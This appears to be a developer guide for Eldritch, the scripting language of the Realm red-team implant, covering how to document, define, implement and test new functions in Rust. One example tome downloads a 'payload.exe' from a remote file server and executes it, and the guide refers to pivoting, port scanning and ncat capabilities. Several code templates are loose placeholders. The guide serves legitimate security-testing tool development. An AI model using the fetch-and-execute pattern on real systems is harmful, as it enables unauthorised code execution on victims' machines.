---
title: Eldritch
tags: 
 - Dev Guide
description: Want to contribute to Eldritch? Start here!
permalink: dev-guide/eldritch
---

# Overview
Eldritch expands the capability of realm agents allowing them to perform actions programmatically.
Not all tasks should be done through Eldritch though. Eldritch is meant to create the building blocks that operators can use during tests.
Creating a function that is too specific could limit it's usefulness to other users.

**For example**: if you want to download a file to a specific location, execute it, and return the functions result this should be chunked into separate `download`, and `execute` functions within Eldritch. The example use case should look like:

The Eldritch tome could look like this:
```python
file.download("http://fileserver.net/payload.exe", "C:/temp/")
sys.execute("C:/temp/payload.exe")
```

_Exceptions to the rule above exist if performing the activities requires the performance of rust. 

Eg. port scanning could be implemented using a for loop and tcp\_connect however due to the performance demand of port scanning a direct implementation in rust makes more sense_

Want to contribute to Eldritch but aren't sure what to build check our ["good first issue" tickets.](https://github.com/KCarretto/realm/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)

## What files should I modify to make an Eldritch function.
---
#### Documentation
`docs/_docs/user-guide/Eldritch.md`
Add your function to the docs. Give your function a unique and descriptive name. Assign it to an Eldritch module.

Currently Eldritch has four modules your function can fall under:
* `file`: Is used for any on disk file processing.
* `pivot`: Is used to migrate to identify, and migrate between systems. The pivot module is also responsible for facilitating connectivity within an environment.
* `process`: Is used to manage running processes on a system.
* `sys`: Is used to check system specific configurations and start new processes.
If your function does not fall under a specific module reach out to the core developers about adding a new module or finding the right fit.

Specify the input and output according to the [Starlark types spec.](https://docs.rs/starlark/0.6.0/starlark/values/index.html)
If there are OS or edge case specific behaviors make sure to document them here. If there are limitations Eg. if a function doesn't use file streaming specify that it can't be used for large files.
```markdown
### module.function
module.function(arg1: str, arg2: int, arg3: list) -> bool

The <b>module.function</b> describe your function and edge cases.

```
#### Eldritch definition
`implants/Eldritch/src/module.rs`
Add a function definition here, where `module.rs` is the name of the module you selected above. This is how the Eldritch language is made aware that your function exists.

Add the import for your functions implementation at the top, try to keep these in alphabetical order for readability.
Then add the function definition under the methods function
```RUST
...
mod function_impl;
...
#[starlark_module]
fn methods(builder: &mut MethodsBuilder) {
...
    fn function(_this: ModuleLibrary, arg1: String, arg2: u8, arg3: Vec<String>) -> bool {
        function_impl::function(arg1, arg2, arg3)
    }
```

You may notice that some functions follow the pattern:
```RUST
    fn function(_this: ModuleLibrary, arg1: String, arg2: u8, arg3: Vec<String>) -> NoneType {
        function_impl::function(arg1, arg2, arg3)?;
        Ok(NoneType{})
    }
```
This pattern is only used for none type returns since we're returning Starlark None. Returning like this in the module file is more streamlined than having each module return a special starlark type.

### Eldritch Implementation
`implants/Eldritch/src/module/function_impl.rs`
Add your function implementation here, where `/module/` is the name of the module you selected above and `/function_impl.rs` is the name of your function with `_impl.rs` appended after it. This should match what's been put in the module file.
This file will contain the actual implementation, helper functions, and unit tests for your function.

Here's a template of how your code should look:
```RUST
use anyhow::Result;

fn helper(argz: String) -> bool {
    // Do helper stuff
}

pub fn function(path: arg1: String, arg2: u8, arg3: Vec<String>) -> bool {
    // Do code stuff
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_function_basic() -> anyhow::Result<()>{
        // Setup
        // Run code
        // Check results
        assert_eq!(res, true)
    }

    #[test]
    fn test_function_negative() -> anyhow::Result<()>{
        // Setup
        // Run code
        // Check that expected failures occur
        assert_eq!(res, false)
    }

    #[test]
    fn test_function_helper() -> anyhow::Result<()>{
        // Setup
        // Run helper code
        // Check results
        assert_eq!(res, true)
    }

    // More tests! 🚀
}
```
### Testing
Testing can be really daunting especially with complex system functions required by security professionals.
If you have any questions or hit any road blocks please reach out we'd love to help, also feel free to open a draft PR with what you have and mark it with the `help wanted` tag.
Testing isn't meant to be a barrier to contributing but instead a safety net so you know your code doesn't affect other systems. If it's become a blocker please reach out so we can help 🙂

**Goals**
1. Cross platform
2. Test basic functionality.
3. Test negative cases.
4. Prevent regression.
5. Test edge cases.

**Tips**
Any methods added to the Eldritch Standard Library should have tests collocated in the method's `<name>_impl.rs` file. Here are a few things to keep in mind:
* Tests should be cross platform
    * Rely on [NamedTempFile](https://docs.rs/tempfile/1.1.1/tempfile/struct.NamedTempFile.html) for temporary files
    * Rely on [path.join](https://doc.rust-lang.org/stable/std/path/struct.Path.html) to construct OS-agnostic paths
* Chunk out implementation code into discrete helper functions so each can be tested individually.

### Example PR for an Eldritch method.
Check out [this simple example of a PR](https://github.com/KCarretto/realm/pull/69/files) to see what they should look like.
This PR implements the `file.is_file` function into Eldritch and is a simple example of how to get started.


## Notes about asynchronous Eldritch code.
---
### Async example
So you want to write async code in an Eldritch function. This section is for you.

The starlark bindings we're using to create Eldritch are not asynchronous therefore the Eldritch function itself cannot be asynchronous.
To get around this we use the [`tokio::runtime::Runtime.block_on()`](https://docs.rs/tokio/latest/tokio/runtime/struct.Runtime.html#method.block_on) function in conjunction with two asynchronous helpers.

We'll create the following three functions to manage concurrent tasks: 
* `pub fn function` - Eldritch function implementation which will implement the `tokio::runtime::Runtime.block_on()` function.
* `async fn handle_function` - Async helper function that will start, track, and join async tasks.
* `async fn run_function` - Async function runner that gets spawned by the `handle_function` function.

An example of how you might run multiple concurrent tasks asynchronously.
```RUST
// Async handler for Eldritch function
async fn run_function(argstr: String) -> Result<String> {
    // Do async stuff
}

async fn handle_function(arg1: Vec<String>) -> Result<Vec<String>> {
    let mut result: Vec<String> = Vec::new();
    // This vector will hold the handles to our futures so we can retrieve the results when they finish.
    let mut all_result_futures: Vec<_> = vec![];
    // Iterate over all values in arg1.
    for value in arg1 {
        // Iterate over all listed ports.
        let resulting_future = run_function(value);
        all_result_futures.push(task::spawn(resulting_future));
    }

    // Await results of each job.
    // We are not acting on scan results independently so it's okay to loop through each and only return when all have finished.
    for task in all_result_futures {
        match task.await? {
            Ok(res) => result.push(res),
            Err(err) => return anyhow::private::Err(err),
        };
    }

    Ok(result)
}

// Non-async wrapper for our async scan.
pub fn function(arg1: Vec<String>) -> Result<Vec<String>> {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();

    let response = runtime.block_on(
        handle_function(target_cidrs)
    );

    match response {
        Ok(result) => Ok(result),
        Err(_) => return response,
    }
}

// Testing ...
```

**Testing async code requires some additional work**
An example of how async can be tested is found in this [PR for the Eldritch `pivot.ncat` implementation](https://github.com/KCarretto/realm/pull/44/files).

You'll need to write tests for your synchronous and asynchronous code.
Async tests will start 

Tests for async functions may look like this:
```RUST
// Command implementation code.
// ....

#[cfg(test)]
mod tests {
    use super::*;
    use tokio::task;

    // Example of how to run two functions concurrently.
    // This can be useful in for testing something like a tcp connect function
    // where a test listener needs to be running too.
    #[tokio::test]
    async fn test_function_async_basic() -> anyhow::Result<()> {
        let expected_response_1 = String::from("Hello world!");
        let expected_response_2 = String::from("Good bye!");

        let task1_handler = task::spawn(
            setup_task()
        );

        let task2_handler = task::spawn(
            handle_function(["Good", "bye!"])
        );

        let (task1_handler_res, task2_handler_res) = tokio::join!(task1_handler,task2_handler);

        assert_eq!(expected_response_1, task1_handler_res.unwrap());
        assert_eq!(expected_response_2, task2_handler_res.unwrap());
    }

    // Make sure to test the synchronous handler for the test too.
    // This makes sure that our Eldritch implementation correctly passes
    // the function call from synchronous space to asynchronous space.
    #[test]
    fn test_function_not_async() -> anyhow::Result<()> {
        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();

        let response = runtime.block_on(
            function(["Test", "123"]);
        );
        let test_port = response.unwrap()[0];
    }
}
```

### Async PR example
Check out [this an example of an async PR](https://github.com/KCarretto/realm/pull/45/files).
This PR implements the `pivot.port_scan` function into Eldritch and is an example of how and when async functions are required.


